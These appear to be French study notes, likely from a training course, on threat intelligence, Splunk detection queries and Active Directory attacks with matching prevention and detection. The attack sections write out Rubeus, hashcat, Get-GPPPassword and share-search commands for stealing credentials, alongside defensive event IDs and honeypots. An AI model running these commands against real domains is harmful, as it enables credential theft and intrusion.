Le CTI (Cyber Threat Intelligence) désigne l’ensemble des informations analysées sur les menaces cyber permettant d’anticiper, détecter, comprendre et répondre aux attaques. Son objectif est de passer d’une posture défensive réactive à une posture proactive.

Les 4 piliers du CTI efficace :
Pertinence : L’information doit concerner l’environnement ou les partenaires de l’entreprise.
Temporalité : L’information doit être transmise rapidement – elle perd de la valeur avec le temps.
Actionnabilité : Elle doit pouvoir être utilisée immédiatement pour renforcer la défense.
Exactitude : L'information doit être vérifiée. Sinon, on indique un niveau de confiance.

🆚 CTI vs. Threat Hunting :

| CTI (Prédictif)                                     | Threat Hunting (Proactif &amp; Réactif)               |
| ------------------------------------------------------- | ----------------------------------------------------- |
| Anticiper l’adversaire (où, quand, comment, pourquoi ?) | Rechercher la présence de l’adversaire dans le réseau |
| Sert à prédire les attaques                             | Sert à détecter des menaces existantes ou passées     |
| Partage d'infos avec les hunters                        | S'appuie sur le CTI pour orienter les recherches      |

Utilité du CTI :
Compréhension des menaces ciblant l’organisation.
Aide à la prise de décision stratégique (réduction du risque).
Mise en place de plans d’action en cas de crise.

Les 3 niveaux de Cyber Threat Intelligence :
Stratégique
Pour les dirigeants (C-suite, VPs)
Répond au "Qui ?" et "Pourquoi ?"
Ex : rapports sur APT28, motivations, cibles, historique
Opérationnel
Pour les managers intermédiaires
Répond au "Comment ?" et "Où ?"
Ex : tactiques détaillées d’un groupe comme REvil
Tactique
Pour les analystes et défenseurs réseau
Fournit des IOCs : IPs, domaines, hashes, etc.
Utilisé dans les outils de détection (SIEM, EDR, IDS/IPS)

Lire un rapport de CTI tactique – Étapes clés :
Comprendre le contexte du rapport (secteur ciblé, objectif).
Identifier et classifier les IOCs (réseau, hôte, email, etc.).
Comprendre le cycle de vie de l’attaque (souvent mappé au MITRE ATT\&amp;CK).
Vérifier les IOCs (via VirusTotal, OTX, etc.) pour éviter les faux positifs.
Implémenter les IOCs dans l’infrastructure (SIEM, firewall, EDR…).
Chasser les menaces activement (Threat Hunting basé sur les IOCs et TTPs).
Surveiller et apprendre en continu, tout en partageant de nouvelles infos.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Understanding Log Sources &amp; Investigating with Splunk</strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Toutes les commandes</summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-80ff-a6ce-ca4dd37bc1ce"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Commandes de base Splunk
Recherche simple

search index="main" "UNKNOWN"
Opérateurs booléens et de comparaison

index="main" EventCode!=1

Manipulation de champs
fields – Inclure/exclure des champs

fields - User
rename – Renommer des champs

rename Image as Process
eval – Créer ou modifier un champ

eval ProcessPath=lower(Image)
rex – Extraire via regex

rex maxmatch=0 "[^%](?&lt;guid&gt;{.})"

Affichage et tri
table – Afficher des champs spécifiques

table time, host, Image
dedup – Supprimer les doublons

dedup Image
sort – Trier les résultats

sort - time

Statistiques et visualisation
stats – Agrégations statistiques

stats count by time, Image
chart – Graphiques/agrégats visuels

chart count by time, Image

Lookups et enrichissement
lookup – Croiser avec une source externe

lookup malwarelookup.csv filename OUTPUTNEW ismalware
inputlookup – Lire un fichier de lookup

| inputlookup malwarelookup.csv

⏱ Filtrage temporel

index="main" earliest=-7d EventCode!=1

Recherche avancée
transaction – Grouper des événements liés

transaction Image startswith=eval(EventCode=1) endswith=eval(EventCode=3) maxspan=1m
Subsearch – Requête imbriquée

index="main" EventCode=1 NOT [ search ... ]

Découverte de données
Lister les index

| eventcount summarize=false index= | table index
Lister les sourcetypes

| metadata type=sourcetypes
Afficher les logs bruts
sourcetype="WinEventLog:Security" | table raw

Data Models &amp; Pivot
Data Models : Modèle structuré de données Splunk (base des CIM).
Pivot : Interface graphique pour requêtes sans écrire du SPL.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Intrusion Detection With Splunk (Real-world Scenario)</strong></summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-8003-997c-c81a221dd91d"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Introduction
Passage de l’analyse de logs individuels à la surveillance réseau complète.
Utilisation des Windows Event Logs multi-machines pour détecter les activités malveillantes.
Objectif : filtrer les faux positifs et créer des requêtes précises pour générer des alertes fiables.

Sources de Données
Données à ingérer :
BOTS (Boss of the SOC) – Fournies par Splunk.
logs.to – Génére des logs JSON factices.
    
     À configurer avec Indexed Extractions = JSON.
    
Exemple de requête pour tout afficher :

index="main" earliest=0
Plus de 500 000 événements simulés, avec divers types d’attaques et infections.

Techniques de Recherche Efficaces
Comparaison de recherches :
Recherche générale :

index="main" uniwaldo.local
Recherche par wildcard (moins performante) :

index="main" uniwaldo.local
Recherche ciblée par champ (optimisée) :

index="main" ComputerName="uniwaldo.local"

Événements Sysmon à surveiller

| Event ID | Signification |
| --- | --- |
| 1 | Création de processus (parent/enfant anormaux) |
| 3 | Connexions réseau (bruyant mais utile) |
| 5 | Fin de processus (kill suspects) |
| 6 | Chargement de driver (BYOD, rootkits) |
| 10 | Accès mémoire (dump, injection, lsass) |
| 25 | Détournement de processus (tampering) |
Exemple - Parent/Child suspects :

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | stats count by ParentImage, Image

Détection Avancée &amp; IP Suspectes
Exemple de recherche IP :

index="main" 10.0.0.229 | stats count by sourcetype
Permet d’identifier des connexions sortantes potentiellement malveillantes.
Dumping de credentials (lsass) :

index="main" EventCode=10 lsass | stats count by SourceImage

Création d’Alertes Précises
Étapes :
Détection des appels UNKNOWN :

index="main" CallTrace="UNKNOWN" | stats count by EventCode
Filtrage des faux positifs (JIT, .NET, wow64, etc.) :

index="main" CallTrace="UNKNOWN" SourceImage!="Microsoft.NET" CallTrace!=ni.dll" CallTrace!=clr.dll" CallTrace!=wow64" | where SourceImage!=TargetImage | stats count by SourceImage
Exclusion d’Explorer.exe et regroupement complet :

index="main" CallTrace="UNKNOWN" SourceImage!="Microsoft.NET" CallTrace!=ni.dll" CallTrace!=clr.dll" CallTrace!=wow64*" SourceImage!="C:\Windows\Explorer.EXE" | where SourceImage!=TargetImage | stats count by SourceImage, TargetImage, CallTrac
Produit une alerte fiable sur les anomalies réelles.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Attacker Behavior With Splunk Based On TTPs</strong></summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-8050-b4dd-cb52660ba09b"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Détection des Tactiques, Techniques et Procédures (TTPs) dans Splunk

En cybersécurité, identifier les TTPs des attaquants est essentiel pour détecter efficacement les menaces. Cela implique de repérer des comportements connus malveillants ou des anomalies inhabituelles.
Deux approches complémentaires :
TTPs connus : utiliser des comportements d'attaque documentés pour créer des règles de détection précises.
Détection d'anomalies : repérer des schémas inhabituels via des analyses statistiques, sans connaissance préalable de l'attaque.

Le bon équilibre entre ces deux méthodes permet une couverture large et efficace. Des ajustements réguliers des requêtes et des seuils sont nécessaires pour affiner les résultats et limiter les faux positifs.

Exemples de Recherches SPL Basées sur des TTPs Connus
Reconnaissance via binaires Windows natifs

Les outils comme ipconfig.exe, net.exe, ou whoami.exe sont souvent utilisés par les attaquants pour l’exploration initiale.

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 Image=\ipconfig.exe OR Image=\net.exe OR Image=\whoami.exe OR Image=\netstat.exe OR Image=\nbtstat.exe OR Image=\hostname.exe OR Image=\tasklist.exe
| stats count by Image, CommandLine
| sort - count

Téléchargement malveillant depuis des domaines réputés (ex: GitHub)

index="main" sourcetype="WinEventLog:Sysmon" EventCode=22 QueryName="github"
| stats count by Image, QueryName

Utilisation suspecte de PsExec

Cas 1 – Écriture dans la base de registre :

index="main" sourcetype="WinEventLog:Sysmon" EventCode=13 Image="C:\Windows\system32\services.exe" TargetObject="HKLM\System\CurrentControlSet\Services\\ImagePath"
| rex field=Details "(?&lt;regfilename&gt;[^\\]+)$"
| eval filename = if(isnull(filename),regfilename,lower(filename))
| stats values(Image) AS Image, values(Details) AS RegistryDetails, values(time) AS EventTimes, count by file_name, ComputerName

Cas 2 – Fichiers suspects (Event ID 11)

index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image=System
| stats count by TargetFilename

Cas 3 – Nom de pipe inter-process suspect (Event ID 18)

index="main" sourcetype="WinEventLog:Sysmon" EventCode=18 Image=System
| stats count by PipeName

Utilisation d’archives pour l’exfiltration ou le transfert

index="main" EventCode=11 (TargetFilename=".zip" OR TargetFilename=".rar" OR TargetFilename=".7z")
| stats count by ComputerName, User, TargetFilename
| sort - count

Téléchargements via PowerShell ou Edge


index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image="powershell.exe"
| stats count by Image, TargetFilename
| sort + count

Microsoft Edge (Zone.Identifier)

index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image="msedge.exe" TargetFilename="Zone.Identifier"
| stats count by TargetFilename
| sort + count

Exécution depuis des emplacements inhabituels

index="main" EventCode=1
| regex Image="C:\\Users\\.\\Downloads\\."
| stats count by Image

Exécutables créés hors du répertoire Windows

index="main" EventCode=11 (TargetFilename=".exe" OR TargetFilename=".dll") TargetFilename!="\windows\"
| stats count by User, TargetFilename
| sort + count

Détection de binaires mal orthographiés (ex: psexe au lieu de PsExec)

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1
(CommandLine="psexe.exe" NOT (CommandLine="PSEXESVC.exe" OR CommandLine="PsExec64.exe"))
OR (ParentCommandLine="psexe.exe" NOT (ParentCommandLine="PSEXESVC.exe" OR ParentCommandLine="PsExec64.exe"))
OR (ParentImage="psexe.exe" NOT (ParentImage="PSEXESVC.exe" OR ParentImage="PsExec64.exe"))
OR (Image="psexe.exe" NOT (Image="PSEXESVC.exe" OR Image="*PsExec64.exe"))
| table Image, CommandLine, ParentImage, ParentCommandLine

Ports non standards (commandes ou tunnels suspects)

index="main" EventCode=3
NOT (DestinationPort=80 OR DestinationPort=443 OR DestinationPort=22 OR DestinationPort=21)
| stats count by SourceIp, DestinationIp, DestinationPort
| sort - count</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong>Detecting Attacker Behavior With Splunk Based On Analytics</strong></summary><div class="indented"><pre class="code code-wrap" id="1e825200-7eb4-80ac-bd9a-ca9b8aecbedb"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Détection d'anomalies dans Splunk : Identifier les comportements inhabituels

Dans le domaine de la cybersécurité, la détection basée sur les anomalies est essentielle pour identifier des comportements suspects qui échappent aux méthodes classiques fondées sur les TTP (Tactics, Techniques, and Procedures). En profilant l’activité normale d’un système, Splunk permet, grâce à des commandes statistiques comme streamstats, de repérer les écarts significatifs qui pourraient indiquer une compromission.

Exemple 1 : Détection de connexions réseau anormales avec streamstats

Cette requête surveille la fréquence des connexions réseau par processus. Elle signale ceux qui dépassent un seuil statistique basé sur leur comportement historique.

index="main" sourcetype="WinEventLog:Sysmon" EventCode=3
| bin time span=1h
| stats count as NetworkConnections by time, Image
| streamstats timewindow=24h avg(NetworkConnections) as avg stdev(NetworkConnections) as stdev by Image
| eval isOutlier=if(NetworkConnections &gt; (avg + 0.5  stdev), 1, 0)
| search isOutlier=1

Explication :
streamstats calcule la moyenne et l’écart-type glissants sur 24h.
Un processus est signalé s’il dépasse la moyenne de plus de 0,5 écart-type.

Exemple 2 : Détection de commandes anormalement longues

Des lignes de commande très longues peuvent indiquer des tentatives d’évasion ou d’obfuscation.

index="main" sourcetype="WinEventLog:Sysmon" Image=cmd.exe
| eval len=len(CommandLine)
| table User, len, CommandLine
| sort - len

Pour affiner les résultats, on peut exclure les processus parent bénins :

index="main" sourcetype="WinEventLog:Sysmon" Image=cmd.exe 
ParentImage!="msiexec.exe" ParentImage!="explorer.exe"
| eval len=len(CommandLine)
| table User, len, CommandLine
| sort - len

Exemple 3 : Activité inhabituelle de cmd.exe par utilisateur

Ce cas détecte une augmentation soudaine de l’utilisation de cmd.exe pour un utilisateur donné.

index="main" EventCode=1 (CommandLine="cmd.exe")
| bucket time span=1h
| stats count as cmdCount by time User CommandLine
| eventstats avg(cmdCount) as avg stdev(cmdCount) as stdev
| eval isOutlier=if(cmdCount &gt; avg + 1.5  stdev, 1, 0)
| search isOutlier=1

Exemple 4 : Chargement rapide de nombreuses DLLs

Une activité malveillante peut charger plusieurs DLLs en peu de temps. Cette requête identifie les processus impliqués :

index="main" EventCode=7 
NOT (Image="C:\Windows\System32") NOT (Image="C:\Program Files")
| bucket time span=1h
| stats dc(ImageLoaded) as uniquedllsloaded by time, Image
| where uniquedllsloaded &gt; 3
| stats count by Image, uniquedllsloaded
| sort - uniquedlls_loaded

Exemple 5 : Exécutions multiples d’un même processus sur un hôte

Des exécutions répétées peuvent trahir des activités suspectes :

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1
| transaction ComputerName, Image
| where mvcount(ProcessGuid) &gt; 1
| stats count by Image, ParentImage

Pour cibler des cas particuliers, comme rundll32.exe exécuté par svchost.exe :

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1
| transaction ComputerName, Image
| where mvcount(ProcessGuid) &gt; 1
| search Image="C:\Windows\System32\rundll32.exe" ParentImage="C:\Windows\System32\svchost.exe"
| table CommandLine, ParentCommandLine</code></pre></div></details><p class="" id="1e825200-7eb4-8024-b97c-d379185fbe61">
</p></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0"><strong> Windows Attacks &amp; Defense </strong></summary><div class="indented"><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Kerberoasting</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8067-bdb1-c533f09facff"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Kerberoasting dans Active Directory – Explication, Attaque, Prévention et Détection
Qu'est-ce qu'un SPN ?

Un Service Principal Name (SPN) est un identifiant unique utilisé par Kerberos pour authentifier un service sans avoir besoin de connaître le nom de compte du service. Lorsqu’un ticket TGS (Ticket Granting Service) est demandé, il est chiffré avec le hash NTLM du compte de service.

Kerberoasting : Principe de l’attaque

Kerberoasting est une technique post-exploitation. Elle consiste à :
Récupérer les tickets TGS de services (associés aux SPNs).
Les cracker hors ligne afin de retrouver le mot de passe du compte de service.

L’attaque est d’autant plus efficace si :
Le mot de passe du compte est faible.
Le ticket utilise un algorithme de chiffrement vulnérable.
Algorithmes de chiffrement utilisés :
AES : très sécurisé, difficile à cracker.
RC4 : fréquemment vulnérable.
DES : obsolète, rarement utilisé aujourd’hui.

Malgré les recommandations de sécurité, RC4 et DES sont encore présents dans certains environnements.

Chemin d'attaque
Extraction des tickets TGS

Avec des outils comme Rubeus, un attaquant peut extraire les tickets Kerberos liés aux comptes SPN :

PS C:\Users\bob\Downloads&gt; .\Rubeus.exe kerberoast /outfile:spn.txt
Les tickets sont enregistrés dans spn.txt.
Crackage des tickets

Les hashes extraits sont ensuite transférés sur un outil comme Hashcat (Linux/Kali) pour tentative de bruteforce :

hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
-m 13100 : mode Hashcat pour Kerberoasting.
passwords.txt : dictionnaire de mots de passe.
Résultat : les mots de passe de comptes de service sont révélés en clair.

cat cracked.txt
Prévention

Pour contrer cette attaque :
Mots de passe robustes : longs et complexes (idéalement &gt; 100 caractères).
Limiter les comptes SPN : supprimer les SPN inutilisés.
Utiliser les GMSA (Group Managed Service Accounts) : mots de passe gérés et renouvelés automatiquement.

Détection

Chaque demande de TGS génère un événement Windows ID 4769. Bien qu’il soit difficile de tout surveiller, certains comportements sont suspects :
Tickets RC4 : si l’environnement est censé utiliser uniquement AES, alerter sur tout ticket RC4.
Volume anormal de requêtes TGS : surtout depuis un seul poste ou utilisateur.
Comptes honeypot : créer un faux compte avec un SPN, inactif mais attirant. Toute requête à ce compte est suspecte.

Création d’un compte honeypot

Critères pour un compte leurre efficace :
Ancien compte : inactif depuis &gt; 2 ans.
Mot de passe incassable.
SPN réaliste : lié à un service comme IIS ou SQL.

Exemple :

Nom du compte : svc-iam
SPN attribué : HTTP/svc-iam.domain.local
Remarque importante

Multiplier les honeypots peut rendre leur présence détectable. Il est donc crucial d’adapter ces techniques à votre environnement, en combinant sécurité et discrétion.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">AS-REProasting</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-8056-9b36-d47d94d9b1f2"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">AS-REPRoasting dans Active Directory – Description, Attaque, Prévention et Détection
Qu'est-ce que l'AS-REPRoasting ?

L'attaque AS-REPRoasting est similaire au Kerberoasting. Elle cible les comptes utilisateurs configurés sans pré-authentification Kerberos (option "Do not require Kerberos preauthentication"). Cette configuration permet aux attaquants de récupérer des hashs Kerberos crackables sans interaction avec le mot de passe du compte.

Le succès de l’attaque dépend principalement de la robustesse du mot de passe du compte ciblé.

Étapes de l’attaque
Extraction des hashs AS-REP

À l’aide d’outils comme Rubeus, les attaquants extraient les hashs des comptes vulnérables :

PS C:\Users\bob\Downloads&gt; .\Rubeus.exe asreproast /outfile:asrep.txt
Les hashs sont enregistrés dans le fichier asrep.txt.
Préparation du hash pour cracking

Avant le bruteforce, le hash doit être formaté pour Hashcat. Il faut s’assurer que le hash commence par :

$krb5asrep$23$...
Exemple :

$krb5asrep$23$anni@eagle.local:1b912b858c4551c0013dbe81ff0f01d7$c6480335...
Crackage avec Hashcat

Utilisation de Hashcat en mode 18200, spécialement conçu pour les hashs AS-REP :

sudo hashcat -m 18200 -a 0 asrep.txt passwords.txt --outfile asrepcrack.txt --force
Affichage des résultats

Une fois le mot de passe trouvé, l’ouvrir en clair :

cat asrepcrack.txt
Prévention

La sécurité repose principalement sur la configuration des comptes et la politique de mot de passe.
Révision régulière : Désactivez l’option "no preauthentication" sauf si elle est strictement nécessaire. Faites des audits trimestriels pour détecter toute mauvaise configuration.
Politique de mot de passe renforcée : Imposer une longueur minimale de 20 caractères pour les comptes sans pré-authentification.

Détection

Lorsqu’un TGT est demandé, l’événement Windows ID 4768 est généré. Bien que courant, il est possible de détecter des comportements suspects en :
Corrélant les IP/VLAN : Identifier les sources inhabituelles de requêtes.
Analyse comportementale : Surveiller les requêtes fréquentes sur un même compte ou depuis des adresses inconnues.

Déploiement d’un compte honeypot

Un compte honeypot bien configuré peut attirer et identifier les attaques AS-REPRoasting. Il doit répondre à certains critères :
Ancien compte : Inactif depuis longtemps, avec un mot de passe jamais changé.
Connexion récente : Doit apparaître actif pour paraître légitime.
Privilèges assignés : Assez de droits pour attirer l’attention des attaquants.
Pré-authentification désactivée : Condition nécessaire pour l’attaque.

Exemple :

Nom du compte : svc-iam  
Configuration : privilèges élevés, pré-authentification Kerberos désactivée
Conseil de prudence

Évitez de surutiliser les honeypots, au risque de créer des schémas détectables par les attaquants. Sélectionnez les méthodes de détection les plus adaptées à votre environnement pour équilibrer efficacité et discrétion.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">GPP Passwords</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80d5-8056-e82064ae1632"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Exploitation des mots de passe GPP dans SYSVOL – Description, Attaque, Prévention et Détection
Qu’est-ce que SYSVOL ?

SYSVOL est un partage réseau présent sur tous les Domain Controllers (DC), contenant :
Scripts de connexion,
Données de stratégies de groupe (GPO),
Et d'autres fichiers essentiels à l’environnement Active Directory.

Les stratégies de groupe sont stockées ici :

\\&lt;DOMAINE&gt;\SYSVOL\&lt;DOMAINE&gt;\Policies\
Avec Windows Server 2008, les Group Policy Preferences (GPP) ont introduit la possibilité d’enregistrer des identifiants dans certains fichiers XML. Ces identifiants incluent un mot de passe chiffré avec une clé qui a été rendue publique par Microsoft, ce qui rend possible leur déchiffrement par tout utilisateur authentifié du domaine.

Scénario d’attaque
Extraction et déchiffrement des mots de passe GPP

Grâce à des outils comme PowerSploit, un attaquant peut rechercher les fichiers XML contenant le champ cpassword, et les décrypter à l’aide de la clé publiée :

Import-Module .\Get-GPPPassword.ps1
Get-GPPPassword
Exemple de résultat :

UserName  : svc-iis  
Password  : abcd@123  
File      : \\EAGLE.LOCAL\SYSVOL\eagle.local\Policies\{GUID}\Machine\Preferences\Groups\Groups.xml  
Cpassword : qRI/NPQtItGsMjwMkhF7ZDvK6n9KlOhBZ/XShO2IZ80  
Le mot de passe est visible en clair après déchiffrement.

Prévention
Mise à jour critique : Microsoft a publié KB2962486 (2014) pour désactiver la possibilité d’enregistrer de nouveaux mots de passe dans les GPP.
   Attention : cette mise à jour ne supprime pas les anciens mots de passe déjà présents.
Audit régulier : Dans les environnements mis en place avant 2014, il est impératif de vérifier que plus aucun mot de passe n’est exposé dans SYSVOL.

Détection
Surveillance des accès aux fichiers XML contenant cpassword
Activez l’audit sur les dossiers GPP contenant des fichiers sensibles.
Chaque accès génère un événement 4663, utile pour identifier des lectures non légitimes.
Tentatives de connexion avec les identifiants exposés
Surveillez les connexions avec les comptes exposés, notamment :
4624 – Connexion réussie
4625 – Échec de connexion
4768 – Requête de ticket Kerberos (TGT)
Une connexion réussie depuis une machine inattendue est un indicateur fort d’abus.

Déploiement d’un compte honeypot

La mise en place d’un faux compte de service dans un fichier GPP peut piéger les attaquants.
Critères pour un compte honeypot efficace :
Mot de passe invalide : L’identifiant affiché est incorrect ou désuet.
Ancienneté apparente : La date de dernier changement de mot de passe précède la dernière modification du fichier XML.
Simulation d’activité : Une tâche planifiée bidon simule des connexions régulières.
Toute tentative de connexion réelle à ce compte (en dehors du script simulé) déclenche une alerte.
Événements à surveiller :
4625 – Échec de connexion
4771 – Échec d’authentification Kerberos
4776 – Échec d’authentification NTLM

Remarque stratégique

L’usage excessif de leurres trop évidents peut trahir vos mécanismes de détection. Adaptez vos honeypots avec réalisme et discrétion pour maximiser leur efficacité sans éveiller les soupçons.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">GPO Permissions/GPO Files</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-80f2-9d12-d00ba0dc9a8a"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Abus des GPO dans Active Directory – Description, Attaque, Prévention et Détection
Qu’est-ce qu’un GPO ?

Un Group Policy Object (GPO) est un ensemble de configurations appliquées à des objets Active Directory (utilisateurs, ordinateurs) via des Unités d’Organisation (OU). Chaque GPO a un nom unique et peut être filtré par :
Groupes de sécurité (ex. : Domain Users),
Filtres WMI,
OU spécifiques.
Par défaut, seuls les Domain Admins et rôles privilégiés peuvent modifier un GPO. Mais des délégations spécifiques peuvent étendre ces droits à des utilisateurs moins privilégiés.

Vecteurs d’attaque GPO

Un attaquant ayant accès à un compte compromis avec droits d’édition sur un GPO peut :
Ajouter des scripts de démarrage, tâches planifiées ou logiciels malveillants.
Cibler les objets dans l’OU liée au GPO, compromettant ainsi plusieurs machines.

Un autre vecteur courant est l’exploitation de partages réseau mal configurés contenant des fichiers utilisés par des GPOs (ex. : scripts ou exécutables). Si les droits NTFS permettent l'écriture, l’attaquant peut remplacer un fichier légitime par un fichier malveillant, même si le GPO est intact.

Exploitation des permissions GPO
Attaque directe :
Modifier un GPO vulnérable (permissions trop larges).
Ajouter un script ou un exécutable malveillant.
Attaque indirecte :
Identifier un GPO utilisant un fichier sur un partage modifiable.
Remplacer ce fichier par une version malveillante.

Prévention

 Restreindre strictement les permissions GPO :
Limiter les droits de modification à une liste de comptes de confiance.

 Revue régulière des GPOs :
Mettre en place une vérification horaire automatisée des permissions GPO.
Détecter tout écart par rapport aux configurations prévues.

 Sécuriser les partages réseau :
Ne jamais utiliser de fichiers GPO hébergés sur des partages accessibles en écriture à plusieurs utilisateurs.

Détection
Modification d’un GPO

Activez l’audit des modifications d’annuaire pour capturer l’événement suivant :
Event ID 5136 : signale une modification d’objet, y compris de GPO.
Toute modification faite par un utilisateur non autorisé doit générer une alerte immédiate.

Honeypot GPO

Une stratégie avancée de détection consiste à créer un GPO leurre configuré pour attirer un attaquant.
Conditions pour un honeypot GPO efficace :
Lié à des serveurs non critiques.
Suivi automatisé et en temps réel des modifications.
Désactivation automatique en cas de détection d'altération.
Script de détection automatique (PowerShell)

Ce script PowerShell surveille un GPO honeypot spécifique et désactive tout utilisateur l’ayant modifié :

Période de surveillance : 15 minutes
$TimeSpan = (Get-Date) - (New-TimeSpan -Minutes 15)
Recherche des événements 5136 liés au GPO cible
$Logs = Get-WinEvent -FilterHashtable @{LogName='Security';id=5136;StartTime=$TimeSpan} -ErrorAction SilentlyContinue |
Where-Object {$_.Properties[8].Value -match "CN={73C66DBB-81DA-44D8-BDEF-20BA2C27056D},CN=POLICIES,CN=SYSTEM,DC=EAGLE,DC=LOCAL"}

if($Logs){
    $emailBody = "Honeypot GPO '73C66DBB-81DA-44D8-BDEF-20BA2C27056D' was modifiedrn"
    $disabledUsers = @()
    ForEach($log in $logs){
        If(((Get-ADUser -identity $log.Properties[3].Value).Enabled -eq $true) -and ($log.Properties[3].Value -notin $disabledUsers)){
            Disable-ADAccount -Identity $log.Properties[3].Value
            $emailBody += "Disabled user " + $log.Properties[3].Value + "r`n"
            $disabledUsers += $log.Properties[3].Value
        }
    }
    # Envoi d’un e-mail d’alerte (à compléter avec Send-MailMessage)
    $emailBody
}
Une désactivation déclenche l'événement 4725, indiquant qu’un compte a été désactivé.

Recommandations stratégiques

Les honeypots GPO doivent être utilisés dans des environnements matures, dotés de capacités de détection et de réponse rapide. Mal utilisés, ils peuvent devenir évidents pour les attaquants.</code></pre></div></details><details open=""><summary style="font-weight:600;font-size:1.5em;line-height:1.3;margin:0">Credentials in Shares</summary><div class="indented"><pre class="code code-wrap" id="1e925200-7eb4-801c-bc8f-f5a0e261b33d"><code class="language-JavaScript" style="white-space:pre-wrap;word-break:break-all">Exposition des Identifiants dans les Partages Réseau – Description, Attaque, Prévention et Détection
Contexte : Exposition des Identifiants sur les Partages Réseau

L’exposition des identifiants dans les partages réseau est l’une des mauvaise configuration les plus courantes rencontrées dans Active Directory. Bien que ces erreurs surviennent fréquemment dans les grandes entreprises, elles peuvent aussi affecter des petites structures. Ce phénomène ressemble à une évolution de la problématique des mots de passe laissés sur des post-its, en passant à « ne laissez pas de identifiants non chiffrés et de tokens d'autorisation éparpillés sur le réseau ».

Les identifiants peuvent être trouvés dans des scripts et fichiers de configuration sur des partages réseau (ex. : scripts batch, cmd, PowerShell, fichiers ini et config). Par contraste, les identifiants stockés sur les machines locales des utilisateurs se trouvent souvent dans des fichiers texte, Excel ou Word. Toutefois, la différence majeure réside dans le fait que les partages réseau représentent un risque beaucoup plus élevé en raison de leur accessibilité potentielle pour tous les utilisateurs.
Pourquoi les Partages Réseau sont-ils Exposés ?

Il existe plusieurs raisons pour lesquelles un partage réseau devient accessible à tous :
Accès trop large à un partage initialement sécurisé :
   Un administrateur crée un partage avec des restrictions appropriées, mais d'autres administrateurs finissent par étendre l'accès à "Tout le monde" (groupe "Users"), donnant ainsi accès à tous les utilisateurs du domaine.
Mauvaise gestion des partages de scripts :
   Parfois, un administrateur crée un répertoire pour tester des scripts sur le \C:\ ou dans un autre répertoire partagé, mais oublie de restreindre l’accès, exposant ainsi des informations sensibles.
Partages ouverts par négligence :
   Certains partages peuvent être laissés ouverts après une utilisation temporaire pour transférer des fichiers ou installer des logiciels, puis ne sont pas fermés après l’utilisation.
Partages cachés mal compris :
   Les partages cachés (nom de dossier se terminant par "\$") ne sont pas affichés dans l’Explorateur Windows. Cependant, d’autres outils (comme PowerShell ou Command Prompt) peuvent y accéder et y trouver des informations sensibles.
Attaque

L'attaque commence par l'identification des partages réseau accessibles au sein du domaine. Des outils comme Invoke-ShareFinder de PowerView permettent de lister tous les partages disponibles et de vérifier les accès en fonction des permissions de l'utilisateur.

Exemple d’utilisation de PowerView :

PS C:\Users\bob\Downloads&gt; Invoke-ShareFinder -domain eagle.local -ExcludeStandard -CheckShareAccess
Exemple de sortie :

\\DC2.eagle.local\NETLOGON      - Logon server share
\\DC2.eagle.local\SYSVOL        - Logon server share
\\WS001.eagle.local\Share       -
\\WS001.eagle.local\Users       -
\\Server01.eagle.local\dev$     -
L'attaquant peut alors rechercher des mots clés comme "pass", "username", ou "password" dans les fichiers partagés à l’aide de la commande findstr (outil intégré dans Windows) :

Commande PowerShell :

PS Microsoft.PowerShell.Core\FileSystem::\\Server01.eagle.local\dev$&gt; findstr /m /s /i "pass" *.bat
Prévention

La meilleure façon de prévenir cette attaque est de verrouiller l'accès à tous les partages réseau dans le domaine. Il est essentiel d’effectuer des analyses régulières (hebdomadaires) pour détecter tout nouveau partage ouvert ou toute information sensible exposée dans un ancien partage.
Limiter les permissions sur les partages : Restreindre l'accès à seulement les utilisateurs nécessaires.
Audits réguliers : Planifier des scans fréquents des partages réseau pour vérifier leur sécurité.
Utilisation de partages sécurisés : Éviter d’utiliser des partages qui peuvent être modifiés par des utilisateurs non autorisés.
Détection

La détection d'une exploitation des identifiants exposés sur les partages se base sur l’analyse du comportement des utilisateurs et la surveillance des événements associés à l’utilisation des identifiants compromis.

Événements clés à surveiller :
Event ID 4624 : Connexion réussie (connexion avec des identifiants exposés).
Event ID 4768 : Requête de ticket TGT (Kerberos).

Analyser les connexions suspectes ou provenant de lieux inhabituels peut permettre de repérer une exploitation des identifiants.
Honeypot

